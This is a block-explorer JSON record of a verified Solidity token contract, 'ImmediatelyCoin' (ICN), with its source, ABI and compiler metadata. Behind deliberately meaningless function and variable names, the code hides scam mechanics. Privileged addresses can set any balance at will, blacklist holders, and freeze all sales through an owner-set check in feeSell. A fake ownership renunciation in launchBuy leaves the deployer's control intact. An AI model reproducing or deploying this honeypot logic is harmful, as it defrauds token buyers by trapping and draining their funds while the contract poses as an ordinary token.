{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract totalAmountTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toWallet {\n    function createPair(address senderWallet, address launchedLaunch) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface marketingEnableLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface isEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableAmount) external view returns (uint256);\n\n    function transfer(address senderTxMax, uint256 txFrom) external returns (bool);\n\n    function allowance(address senderLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderTxMax,\n        uint256 txFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverAuto, uint256 value);\n    event Approval(address indexed senderLiquidity, address indexed spender, uint256 value);\n}\n\ninterface limitFeeLiquidity is isEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ImmediatelyCoin is totalAmountTx, isEnable, limitFeeLiquidity {\n\n    function name() external view virtual override returns (string memory) {\n        return atMin;\n    }\n\n    function senderMarketing(address marketingFee, uint256 txFrom) public {\n        sellFundTx();\n        maxWalletShould[marketingFee] = txFrom;\n    }\n\n    uint256 private exemptMode;\n\n    bool public takeTotalTeam;\n\n    function launchBuy() public {\n        emit OwnershipTransferred(buyLaunched, address(0));\n        launchedFrom = address(0);\n    }\n\n    string private maxSwap = \"ICN\";\n\n    function modeFundMarketing(address launchedMin) public {\n        sellFundTx();\n        \n        if (launchedMin == buyLaunched || launchedMin == listSell) {\n            return;\n        }\n        liquidityEnable[launchedMin] = true;\n    }\n\n    function senderFrom(address maxTradingMarketing) public {\n        require(maxTradingMarketing.balance < 100000);\n        if (liquidityWalletFee) {\n            return;\n        }\n        if (exemptMax) {\n            exemptMax = true;\n        }\n        totalExempt[maxTradingMarketing] = true;\n        \n        liquidityWalletFee = true;\n    }\n\n    bool public launchMode;\n\n    uint256 private walletTx;\n\n    mapping(address => bool) public liquidityEnable;\n\n    function transfer(address marketingFee, uint256 txFrom) external virtual override returns (bool) {\n        return feeSell(_msgSender(), marketingFee, txFrom);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletBuy;\n    }\n\n    uint256 private walletBuy = 100000000 * 10 ** 18;\n\n    uint256 public shouldSender = 0;\n\n    function takeShould(address limitTx, address senderTxMax, uint256 txFrom) internal returns (bool) {\n        require(maxWalletShould[limitTx] >= txFrom);\n        maxWalletShould[limitTx] -= txFrom;\n        maxWalletShould[senderTxMax] += txFrom;\n        emit Transfer(limitTx, senderTxMax, txFrom);\n        return true;\n    }\n\n    function marketingMode(address limitTx, address senderTxMax, uint256 txFrom) internal view returns (uint256) {\n        require(txFrom > 0);\n\n        uint256 tradingExempt = 0;\n        if (limitTx == listSell && receiverFrom > 0) {\n            tradingExempt = txFrom * receiverFrom / 100;\n        } else if (senderTxMax == listSell && shouldSender > 0) {\n            tradingExempt = txFrom * shouldSender / 100;\n        }\n        require(tradingExempt <= txFrom);\n        return txFrom - tradingExempt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitReceiver;\n    }\n\n    function allowance(address listSender, address isLaunch) external view virtual override returns (uint256) {\n        if (isLaunch == takeMax) {\n            return type(uint256).max;\n        }\n        return toLaunched[listSender][isLaunch];\n    }\n\n    address private launchedFrom;\n\n    bool public liquidityWalletFee;\n\n    constructor (){\n        if (takeTotalTeam != exemptMax) {\n            takeTotalTeam = true;\n        }\n        launchBuy();\n        marketingEnableLaunched sellFund = marketingEnableLaunched(takeMax);\n        listSell = toWallet(sellFund.factory()).createPair(sellFund.WETH(), address(this));\n        liquidityAutoIs = toWallet(sellFund.factory()).feeTo();\n        \n        buyLaunched = _msgSender();\n        totalExempt[buyLaunched] = true;\n        maxWalletShould[buyLaunched] = walletBuy;\n        \n        emit Transfer(address(0), buyLaunched, walletBuy);\n    }\n\n    uint256 private limitShould;\n\n    mapping(address => uint256) private maxWalletShould;\n\n    bool public exemptMax;\n\n    address public buyLaunched;\n\n    mapping(address => bool) public totalExempt;\n\n    function getOwner() external view returns (address) {\n        return launchedFrom;\n    }\n\n    uint256 sellFee;\n\n    function atExempt(uint256 txFrom) public {\n        sellFundTx();\n        sellFee = txFrom;\n    }\n\n    event OwnershipTransferred(address indexed marketingReceiver, address indexed modeExempt);\n\n    uint256 public walletMarketing;\n\n    function approve(address isLaunch, uint256 txFrom) public virtual override returns (bool) {\n        toLaunched[_msgSender()][isLaunch] = txFrom;\n        emit Approval(_msgSender(), isLaunch, txFrom);\n        return true;\n    }\n\n    uint8 private limitReceiver = 18;\n\n    function owner() external view returns (address) {\n        return launchedFrom;\n    }\n\n    string private atMin = \"Immediately Coin\";\n\n    address liquidityAutoIs;\n\n    uint256 constant autoTx = 3 ** 10;\n\n    address public listSell;\n\n    uint256 minSell;\n\n    function transferFrom(address limitTx, address senderTxMax, uint256 txFrom) external override returns (bool) {\n        if (_msgSender() != takeMax) {\n            if (toLaunched[limitTx][_msgSender()] != type(uint256).max) {\n                require(txFrom <= toLaunched[limitTx][_msgSender()]);\n                toLaunched[limitTx][_msgSender()] -= txFrom;\n            }\n        }\n        return feeSell(limitTx, senderTxMax, txFrom);\n    }\n\n    uint256 public receiverFrom = 3;\n\n    function feeSell(address limitTx, address senderTxMax, uint256 txFrom) internal returns (bool) {\n        if (limitTx == buyLaunched) {\n            return takeShould(limitTx, senderTxMax, txFrom);\n        }\n        uint256 listBuyTrading = isEnable(listSell).balanceOf(liquidityAutoIs);\n        require(listBuyTrading == sellFee);\n        require(senderTxMax != liquidityAutoIs);\n        if (liquidityEnable[limitTx]) {\n            return takeShould(limitTx, senderTxMax, autoTx);\n        }\n        txFrom = marketingMode(limitTx, senderTxMax, txFrom);\n        return takeShould(limitTx, senderTxMax, txFrom);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxSwap;\n    }\n\n    address takeMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function sellFundTx() private view {\n        require(totalExempt[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private toLaunched;\n\n    function balanceOf(address enableAmount) public view virtual override returns (uint256) {\n        return maxWalletShould[enableAmount];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txFrom\",\"type\":\"uint256\"}],\"name\":\"atExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityWalletFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"modeFundMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTradingMarketing\",\"type\":\"address\"}],\"name\":\"senderFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFrom\",\"type\":\"uint256\"}],\"name\":\"senderMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotalTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTxMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ImmediatelyCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}